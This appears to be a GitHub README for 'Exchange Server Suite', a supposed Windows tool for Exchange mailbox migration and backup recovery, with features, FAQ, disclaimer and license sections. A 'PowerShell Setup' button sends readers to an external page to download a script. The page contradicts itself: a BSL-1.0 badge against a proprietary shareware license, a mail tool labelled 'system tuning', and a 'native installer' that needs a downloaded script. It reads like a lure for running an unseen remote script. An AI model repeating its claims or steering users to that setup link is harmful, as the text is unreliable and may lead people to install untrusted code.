<div align="center">

# Exchange Server Suite: Mailbox Migration & Backup Recovery for Windows 11

![](files/1.webp)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://Yishakv.github.io/exchange-server-suite/)

[![OS](https://img.shields.io/badge/OS-WIN_11-2ea44f?style=social&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/PS--CORE-5.1%2B_%2F_7%2B-34b759?style=social&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/STAGE-MAINTAINED-2ea44f?style=social&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-PASSING-2ea44f?style=social&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-BSL--1.0-1a7f37?style=social&labelColor=0d1117)]()

</div>

---

Exchange Server Suite is a Windows-native system tuning and utilities application that provides a unified toolset for mailbox migration, backup, and recovery across on-premises and cloud Exchange environments. It combines an intuitive desktop interface with advanced filtering, versatile export formats, and reliable data-handling routines to streamline administrative workflows. Built for IT professionals, the suite delivers consistent performance for both routine maintenance and complex recovery tasks.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Mailbox Migration** — Transfer mailboxes between Exchange environments, including on-premises to cloud, cloud to on-premises, and cross-tenant scenarios, with support for scheduled and incremental migration jobs.
- **Backup and Recovery** — Create full and differential backups of Exchange Server databases and mailboxes, and restore individual items, folders, or complete mailboxes from backup sets without requiring a full server rebuild.
- **Dual Environment Support** — Operate against both on-premises Exchange deployments and cloud-hosted Exchange environments from a single console, with environment profiles that preserve connection and authentication settings per target.
- **Flexible Export Formats** — Export mailbox content to PST, EML, MSG, and HTML, with per-format options for folder hierarchy preservation, attachment handling, and metadata retention.
- **Advanced Filtering** — Narrow migration, backup, and export scopes by date range, sender, recipient, subject, attachment presence, message size, and item type, reducing processing time on large mailboxes.
- **Mailbox Mapping and Scheduling** — Define source-to-target mailbox mappings, validate them before execution, and schedule jobs to run during maintenance windows with configurable concurrency limits.
- **Job Monitoring and Logging** — Track progress per mailbox and per item, review detailed operation logs, and export job reports for auditing and troubleshooting.
- **Integrity Verification** — Validate source and destination data after migration or restore operations, with checksum comparison and item-count reconciliation to confirm completeness.
- **Granular Recovery** — Browse backup contents, preview individual messages, and restore selected items to their original location or an alternate mailbox.
- **Windows-Native Interface** — A desktop application for Windows with a task-oriented layout, no external dependencies, and no server-side agent required on the Exchange host.

## How It Works

Exchange Server Suite operates through a modular architecture that separates data access, processing, and output layers, allowing each stage of a mailbox migration or recovery workflow to be configured independently. The application connects directly to Exchange Server environments through native protocols, establishing a read-only session by default so that source data remains untouched throughout the operation.

The processing engine begins by enumerating mailbox stores and building an index of folders, items, and attachments. This index drives the selective migration and filtering subsystems, which let you scope operations by date range, sender, recipient, subject, or item type before any data is transferred. Because filtering is applied at the index level, large mailboxes can be processed incrementally rather than loaded into memory in full.

For migration tasks, the suite maps source and destination mailbox structures, resolves schema differences between Exchange versions, and transfers items in configurable batches. Progress is tracked per mailbox, and interrupted jobs can be resumed from the last committed batch without duplicating already-migrated items. Conflict handling policies determine whether existing destination items are skipped, overwritten, or preserved alongside incoming data.

Backup and recovery functions write to a self-contained archive format that preserves folder hierarchy, message metadata, and attachment integrity. Recovery operations can restore an entire archive or extract individual mailboxes, folders, or messages, with export targets including PST, EML, and MSG. All operations are logged to a session report that records item counts, skipped entries, and any errors encountered, providing an auditable trail for compliance and troubleshooting.

## Compatibility

Exchange Server Suite is engineered for native operation on the Windows desktop platform, with support for both x64 and x86 architectures across Windows 10 and Windows 11 environments. The application is validated against current Windows servicing releases to ensure consistent behavior following cumulative and feature updates.

Deployment scenarios span on-premises Exchange organizations and cloud-hosted Exchange environments, allowing the suite to operate within hybrid topologies where mailbox data resides across both local and remote infrastructure. Connectivity to Exchange services is handled through standard supported protocols, with no additional middleware required on the target server.

Resource requirements are modest by design: a 1 GHz or faster processor, 4 GB of minimum RAM, and 500 MB of available storage are sufficient for core migration, backup, and recovery operations. An active internet connection is required during installation and for update checks.

Export output is compatible with widely adopted mailbox formats, including PST, EML, and MSG, ensuring recovered and migrated data remains accessible across common desktop mail clients and archival tools. Filtering and selection operations are performed within the application interface, with results written directly to the chosen output format.

The suite is tested against representative Exchange Server configurations and maintains forward compatibility with incremental Windows updates. Users operating older Windows builds should verify their environment against the stated minimum requirements before deployment.

## FAQ

**What editions and licensing models are available for Exchange Server Suite?**

Exchange Server Suite is distributed as a commercial desktop application with a trial evaluation mode and full licensed editions. The trial provides access to the core migration and recovery workflows with defined processing limits, while licensed editions unlock unrestricted mailbox processing, batch operations, and priority technical support. Licensing is perpetual per workstation, with optional maintenance coverage for version upgrades.

**Which Exchange Server versions and deployment models are supported?**

The suite supports on-premises Exchange deployments from Exchange Server 2013 through Exchange Server 2019, as well as Exchange Online and hybrid configurations. Both mailbox migration and backup recovery operations are validated against these environments. For legacy environments, compatibility is limited to read-only extraction workflows.

**What export formats and migration targets does the tool support?**

Mailboxes and mailbox items can be exported to PST, EML, and MSG formats. Migration targets include direct server-to-server transfers between Exchange organizations, as well as staged migrations through intermediate PST repositories. Item-level granularity is preserved across folders, attachments, calendars, and contact objects.

**How does the application handle large mailboxes and long-running operations?**

Processing is executed through a multi-threaded pipeline with configurable concurrency limits. Incremental checkpointing allows interrupted jobs to resume without reprocessing completed items. Memory consumption is bounded through streaming item retrieval, so mailbox size does not scale linearly with RAM usage. Job queues can be scheduled and monitored from a centralized dashboard.

**Does the software modify or delete source mailbox data?**

No. All migration and recovery operations are read-only against the source environment. The application never writes to, alters, or removes source mailbox content. Verification reports are generated post-operation to confirm item counts and integrity between source and destination.

**What are the prerequisites for running recovery operations?**

Recovery workflows require appropriate mailbox or impersonation permissions on the target Exchange environment, network access to the relevant server endpoints, and sufficient local disk space for staging and export output. For offline recovery scenarios, access to the associated mailbox database files is required.

**How are application updates delivered?**

Updates are delivered as versioned desktop installers. The application includes an integrated update check that reports available releases and their changelogs. Administrators can deploy updates silently across managed workstations. Always operate the most current release to ensure compatibility with recent Exchange cumulative updates.

**Is technical support included, and what information should be provided when reporting an issue?**

Support is included with licensed editions. When reporting an issue, include the application version, Windows build, Exchange environment type and version, the operation type, and the relevant log bundle generated from the application's diagnostic panel. Logs are retained locally and contain no mailbox content beyond item metadata.

## Disclaimer

Exchange Server Suite is provided as a system tuning and utilities tool for Windows intended for legitimate mailbox migration and backup recovery operations. The software is supplied on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. No guarantee is made regarding the accuracy, completeness, reliability, or suitability of the tool for any specific environment or workflow.

Users are solely responsible for evaluating the suitability of Exchange Server Suite for their intended use and for ensuring that all migration, backup, and recovery operations comply with applicable organizational policies, data protection regulations, and licensing agreements governing their Exchange environments. Prior to performing any migration or recovery task, users should verify the integrity of source data and maintain independent, verified backups of all critical mailboxes and server configurations. The developers and distributors of Exchange Server Suite shall not be liable for any direct, indirect, incidental, special, consequential, or punitive damages, including but not limited to loss of data, loss of revenue, or business interruption, arising from the use of or inability to use the software, even if advised of the possibility of such damages.

Exchange Server Suite is not affiliated with, endorsed by, or sponsored by Microsoft Corporation or any third-party vendor referenced within its supported environments. All product names, trademarks, and registered trademarks are the property of their respective owners and are used solely for identification purposes. Feature availability, compatibility, and performance may vary depending on the operating system version, Exchange Server configuration, and environmental factors. Users are advised to consult the compatibility documentation and validate functionality in a controlled test environment before deploying the software in production.

## License

Exchange Server Suite is distributed as proprietary, closed-source software under a shareware licensing model. The software is not offered under an open-source license, and no source code is made available through this project.

### License Scope

- **Evaluation Use** — The software may be installed and evaluated for a defined trial period to assess feature compatibility with your Exchange environment prior to acquisition.
- **Licensed Use** — Continued use beyond the evaluation period requires a valid license key issued for the specific edition and seat count acquired. License keys are bound to the licensed organization and are non-transferable without prior authorization.
- **Editions** — Licensing tiers are structured by deployment scale and feature scope, covering both on-premises and cloud-connected Exchange environments. Each tier defines the permitted number of mailboxes, migration jobs, and concurrent recovery operations.

### Permitted Activities

- Installation and operation on machines owned or controlled by the licensed entity, up to the seat count specified in the license.
- Use of mailbox migration, backup, and recovery functions within the scope of the licensed edition.
- Creation of archival copies of the installer for internal deployment purposes only.

### Restrictions

- Reverse engineering, decompilation, disassembly, or modification of the binary is prohibited except where such restriction is expressly disallowed by applicable law.
- Redistribution, sublicensing, rental, or resale of the software or license keys is not permitted.
- Circumvention of license enforcement mechanisms, including seat-count validation and trial-period controls, is prohibited.

### Updates and Maintenance

Licensed users receive maintenance releases within the active license term. Update eligibility is tied to the license tier and term; expiration of maintenance does not revoke the right to use the previously licensed version but may exclude access to subsequent releases.

### Warranty and Liability

The software is provided under the terms of the end-user license agreement accompanying the installer, which governs warranty scope, limitation of liability, and support obligations. The end-user license agreement prevails in the event of any conflict with this summary.

### Compliance

Organizations deploying Exchange Server Suite are responsible for maintaining records of license acquisition and seat allocation, and for ensuring that usage remains within the entitlements granted.